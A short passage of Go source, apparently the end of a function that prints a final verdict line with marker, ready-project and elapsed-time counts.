	fmt.Printf("C211C_VERDICT_FINAL %s markers=%d ready=%d elapsed=%ds\n", verdict, markers, len(readyProjects), int(time.Since(started).Seconds()))
}
